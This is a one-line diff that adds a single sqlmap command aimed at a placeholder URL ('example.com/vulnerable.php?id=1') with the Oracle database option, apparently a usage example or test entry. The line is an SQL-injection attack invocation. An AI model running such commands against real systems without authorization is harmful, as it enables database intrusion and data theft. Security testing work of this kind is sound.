@@ -1,0 +1,1 @@
+sqlmap -u 'http://example.com/vulnerable.php?id=1' --dbms=oracle
